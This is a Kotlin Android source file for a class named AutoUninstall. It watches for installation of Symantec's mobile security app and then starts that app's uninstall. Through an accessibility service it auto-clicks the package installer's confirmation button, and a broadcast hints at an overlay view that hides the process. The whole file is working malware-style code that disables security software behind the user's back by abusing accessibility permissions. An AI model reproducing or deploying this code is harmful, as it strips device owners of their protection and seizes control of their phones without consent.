package com.wilsonzhou.accessibility

import android.content.BroadcastReceiver
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.support.v4.content.LocalBroadcastManager
import android.view.accessibility.AccessibilityNodeInfo


class AutoUninstall(val mContext : Context) : EventProcessor {
    private var isStart = false
    private var newTask = false
    private var receiver : BroadcastReceiver? = null
    override fun init(newTask : Boolean) {
        this.newTask = newTask
        isStart = false
        if (receiver == null) {
            receiver = object : BroadcastReceiver() {
                override fun onReceive(p0: Context?, p1: Intent?) {
                    when(p1!!.action) {
                        Intent.ACTION_PACKAGE_ADDED -> {
                            if(p1.dataString.contains("com.symantec.mobilesecurity")) {
                                isStart = true
                                startUninstallIntent()
                            }
                        }
                        Intent.ACTION_PACKAGE_REMOVED -> {
                            if (p1.dataString.contains("com.symantec.mobilesecurity")) {
                                isStart = false
                            }
                        }
                    }
                }
            }
            val filter = IntentFilter()
            filter.addAction(Intent.ACTION_PACKAGE_ADDED)
            filter.addAction(Intent.ACTION_PACKAGE_REMOVED)
            filter.addDataScheme("package")
            mContext.applicationContext.registerReceiver(receiver, filter)
        }
    }

    override fun destroy() {
        if (receiver  != null) {
            mContext.applicationContext.unregisterReceiver(receiver)
            receiver = null
        }
    }
    override fun isReady(): Boolean {
        return isStart
    }

    override fun process(event: AccessibilityEvent) {
        if (!isStart || event.source == null) {
            return
        }
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (event.source.packageName == "com.android.packageinstaller") {
                    val nodes = event.source.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button")
                    if (!nodes.isEmpty()) {
                        nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        // destroy block view if needed
                        LocalBroadcastManager.getInstance(mContext).sendBroadcast(Intent("destroy_view"))
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && event.source.packageName == "com.android.packageinstaller") {
                    val nodes = event.source.findAccessibilityNodeInfosByViewId("android:id/button1")
                    if (!nodes.isEmpty()) {
                        nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        // destroy block view if needed
                        LocalBroadcastManager.getInstance(mContext).sendBroadcast(Intent("destroy_view"))
                    }
                }
            }
        }
    }

    private fun startUninstallIntent() {
        val intent = Intent(mContext, MainActivity::class.java)
        intent.action = "start_uninstall_intent"
        intent.data = Uri.parse("package:com.symantec.mobilesecurity")
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        mContext.startActivity(intent)
    }
}
